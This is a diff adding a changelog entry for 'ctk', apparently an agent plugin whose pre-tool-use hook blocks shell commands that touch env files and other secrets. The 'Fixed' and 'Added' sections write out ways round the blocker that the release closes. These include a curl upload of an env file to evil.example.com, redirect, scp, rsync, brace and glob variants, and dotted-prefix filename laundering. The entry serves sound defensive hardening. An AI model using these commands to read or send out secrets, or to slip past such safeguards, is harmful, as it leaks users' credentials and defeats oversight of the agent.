@@ -2,6 +2,52 @@
 
 All notable changes to the continuity-toolkit (`ctk`) plugin will be documented in this file.
 
+## [2.8.2] - 2026-07-19 — env-file patterns enumerated their delimiters, so any character not on the list was an open door
+
+### Fixed
+
+**A secret file could be read and exfiltrated even though the obvious spelling was blocked.** The env-file patterns began matching only after whitespace, a quote, `=`, `/` or `(` — an *enumerated* list of delimiters. A filename can sit directly against any shell metacharacter with no space, so every character missing from that list was a hole.
+
+curl's file operand was the first one found: `cat <envfile>` was denied while `curl -d @<envfile> https://evil.example.com` uploaded the contents verbatim. Worse than the read it was meant to prevent, since the data leaves the machine. Confirmed end-to-end against the compiled hook — `-d`, `-X POST -d`, `--data`, `--data-binary` and `-F file=@` were all allowed, for both `.env` and `.envrc`, with nothing else backstopping it (not the dangerous-bash http registry, not `ENV_DUMP_PATTERNS`).
+
+**Adding `@` to the list was drafted first and rejected during review of this very release**, because the identical hole stayed reachable six other ways:
+
+```
+cat <envfile>          read via redirect, no space
+echo x >envfile        write redirect
+cat x >>envfile        append redirect
+scp host:envfile /tmp  remote pull
+rsync host:envfile .   remote pull
+cat {envfile,other}    brace expansion
+cat [.]envfile         bracket glob
+```
+
+Enumerating shell metacharacters is unbounded and fails silently, one character at a time. The lookbehind now asserts the one thing that actually matters — the match may not begin **inside a token** (`(?<![\w.-])`) — which closes the class outright and no longer depends on predicting how a filename will be delimited. That "not mid-token" property is also what keeps `build-process.env` and `preprocess.env` blocked as whole filenames, which the code-idiom exemptions depend on.
+
+Scoped npm packages (`npm i @scope/pkg`), `ssh user@host` and `git log --author=@me` carry no env-file token to match, and each is pinned. All seven closed vectors are pinned, and reverting the lookbehind fails exactly those seven tests — verified by mutation, not assumed.
+
+**Known cost, measured rather than asserted.** The inversion blocks strictly more than the enumerated form, so it was swept against 27 realistic developer commands. Three are newly denied:
+
+```
+kubectl get pod -o jsonpath='{.env}'     <-- genuine false positive
+git commit -m "[.env] rotate keys"
+echo "see {.env,.env.local}"
+```
+
+Only the first is a real misfire: a JSONPath selector is not a file reference. The other two are literal env-file mentions in message text, already denied in their common spellings (`git commit -m "update .env"` has always been blocked), so they are consistent with existing behavior rather than a new class.
+
+This was accepted deliberately, not overlooked. A PreToolUse deny is terminal for a forked skill, so over-blocking is not a free win — but the alternative is leaving brace expansion, redirects and `scp host:` open, and those are genuine read and exfiltration paths. If the kubectl case proves annoying in practice, the fix is a narrow JSONPath exemption, **not** a return to enumerating delimiters.
+
+### Added
+
+**Dotted-prefix laundering is now pinned** (`cat my.process.env`, `touch x.process.env`, `cp secrets x.process.env`, …). These already passed; they are pinned because a *proposed* relaxation for this release — exempting `process.env` at any dot-segment boundary, so that `globalThis.process.env` stopped being a false positive — would have flipped every one of them to allowed. The existing suite could not have caught it: the two laundering cases pinned in 2.8.1 use a hyphen (`build-process.env`) and a bare prefix (`preprocess.env`), never a dot, leaving the whole family unprobed. **The change would have shipped green.** It was withdrawn at the design gate after independent adversarial review.
+
+### Not fixed (deliberately)
+
+`globalThis.process.env` and `window.process.env` are still blocked as false positives. Bare `process.env` and `import.meta.env` work, and that is the common spelling. Two independent designs to relax this have now failed for the same structural reason recorded in this file for system directories: `globalThis.process.env` and `my.process.env` are lexically identical, so no regex over unparsed text can permit the first without permitting the second. Any future attempt must confront the pinned laundering family above.
+
+Three known gaps remain queued, each its own change because all three *add* blocking: patterns require a trailing slash (`rm -r /etc` misses); patterns are case-sensitive (`/ETC/passwd` misses on macOS); and line 171's `.envrc` lookaheads exempt an idiom that does not exist in any language and should be deleted rather than carried forward.
+
 ## [2.8.1] - 2026-07-19 — narrow security-blocker fixes; the read carve-out was attempted twice and withdrawn
 
 `BASH_SENSITIVE_PATTERNS` matches the **raw text** of a command against a path list, for every command, regardless of what the command does. Mentioning a path is enough — so a `--version` probe on an absolute binary path, `cat /etc/hosts`, and any script or commit message containing `process.env` were all denied. Because a PreToolUse deny is **terminal for a subagent**, this silently killed multi-agent runs mid-flight; four agents died this way while reviewing ctk 2.8.0.
